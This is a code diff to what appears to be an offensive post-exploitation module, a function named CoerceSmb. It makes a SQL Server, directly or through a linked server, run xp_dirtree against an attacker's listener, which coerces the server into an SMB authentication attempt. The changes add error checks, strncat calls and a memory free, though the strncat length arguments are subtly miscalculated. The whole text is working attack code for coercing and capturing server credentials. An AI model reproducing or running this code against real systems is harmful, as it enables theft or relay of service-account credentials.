@@ -9,6 +9,9 @@ void CoerceSmb(char* server, char* database, char* link, char* impersonate, char
     SQLHENV env		= NULL;
     SQLHSTMT stmt 	= NULL;
 	SQLHDBC dbc 	= NULL;
+	char * query	= NULL;
+	SQLRETURN ret;
+	size_t totalSize;
 
 
     if (link == NULL)
@@ -27,29 +30,35 @@ void CoerceSmb(char* server, char* database, char* link, char* impersonate, char
 	//
 	// allocate statement handle
 	//
-	ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
+	ret = ODBC32$SQLAllocHandle(SQL_HANDLE_STMT, dbc, &stmt);
+	if (!SQL_SUCCEEDED(ret))
+	{
+		internal_printf("[!] Error allocating statement handle\n");
+		goto END;
+	}
 
 	char* linkPrefix = "SELECT 1; ";
 	char* prefix = "EXEC master..xp_dirtree '";
 	char* suffix = "';";
-	char * query;
 
 	if (link == NULL)
 	{
 		internal_printf("[*] Triggering SMB request to %s on %s\n\n", listener, server);
-		query = (char*)intAlloc((MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1) * sizeof(char));
+		totalSize = MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
+		query = (char*)intAlloc(totalSize * sizeof(char));
 		MSVCRT$strcpy(query, prefix);
 	}
 	else
 	{
 		internal_printf("[*] Triggering SMB request to %s on %s via %s\n\n", listener, link, server);
-		query = (char*)intAlloc((MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1) * sizeof(char));
+		totalSize = MSVCRT$strlen(linkPrefix) + MSVCRT$strlen(prefix) + MSVCRT$strlen(listener) + MSVCRT$strlen(suffix) + 1;
+		query = (char*)intAlloc(totalSize * sizeof(char));
 		MSVCRT$strcpy(query, linkPrefix);
-		MSVCRT$strcat(query, prefix);
+		MSVCRT$strncat(query, prefix, totalSize - MSVCRT$strlen(linkPrefix) - 1);
 	}
 	
-	MSVCRT$strcat(query, listener);
-	MSVCRT$strcat(query, suffix);
+	MSVCRT$strncat(query, listener, totalSize - MSVCRT$strlen(linkPrefix) - 1);
+	MSVCRT$strncat(query, suffix, 	totalSize - MSVCRT$strlen(linkPrefix) - 1);
 
 	//
 	// Run the query
@@ -61,6 +70,7 @@ void CoerceSmb(char* server, char* database, char* link, char* impersonate, char
 	internal_printf("[*] SMB request triggered\n");
 
 END:
+	if (query != NULL) intFree(query);
 	ODBC32$SQLCloseCursor(stmt);
 	DisconnectSqlServer(env, dbc, stmt);
 }
